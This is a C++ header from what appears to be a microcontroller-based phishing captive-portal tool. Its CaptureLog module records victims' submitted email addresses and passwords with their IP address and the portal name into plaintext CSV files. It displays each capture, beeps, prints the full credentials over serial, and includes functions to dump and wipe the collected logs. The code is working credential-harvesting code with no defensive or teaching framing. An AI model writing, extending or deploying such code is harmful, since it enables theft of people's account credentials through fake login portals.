#pragma once
#include <FS.h>
#include "AppConfig.h"
#include "AppState.h"
#include "PortalStore.h"
#include "DisplayUI.h"

namespace CaptureLog {

inline String sanitize(String v) {
    v.replace("\\", "_");
    v.replace(",", ";");
    v.replace("\"", "'");
    v.replace("\r", "");
    v.replace("\n", "");
    return v;
}

inline void add(const String& email, const String& pass, const String& ip) {
    String e = sanitize(email), p = sanitize(pass);
    uint32_t ts = g_state.epoch();   // 0 = clock not set; use `time set <epoch>`

    String line = String(ts) + "," + ip + "," + g_state.portal + "," +
                  "\"" + e + "\",\"" + p + "\"\n";

    File all = PortalStore::store().open(String(CAPTURE_DIR) + "/all.csv", "a");
    if (all) { all.print(line); all.close(); }
    if (g_state.portal.length()) {
        File pf = PortalStore::store().open(String(CAPTURE_DIR) + "/" + g_state.portal + ".csv", "a");
        if (pf) { pf.print(line); pf.close(); }
    }

    g_state.captures++;
    DisplayUI::setCaptures(g_state.captures);
    DisplayUI::onCapture(e);
    if (g_state.beep) tone(SPKR_PIN, 1568, 120);

    CMDSER.printf("EVT capture,%u,%s,%s,%s\r\n", ts, ip.c_str(), e.c_str(), p.c_str());
}

inline void dump(Stream& out) {
    File f = PortalStore::store().open(String(CAPTURE_DIR) + "/all.csv", "r");
    if (!f) { out.println("ERR no captures"); return; }
    while (f.available()) out.write(f.read());
    f.close();
    out.println("OK");
}

inline void clear() {
    // remove one file per pass: safe while iterating FAT/LittleFS dirs
    for (int pass = 0; pass < 64; pass++) {
        File dir = PortalStore::store().open(CAPTURE_DIR);
        if (!dir) break;
        File f = dir.openNextFile();
        if (!f) { dir.close(); break; }
        String p = String(CAPTURE_DIR) + "/" + PortalStore::baseName(f.name());
        f.close();
        dir.close();
        PortalStore::store().remove(p);
    }
    g_state.captures = 0;
    DisplayUI::setCaptures(0);
}
}
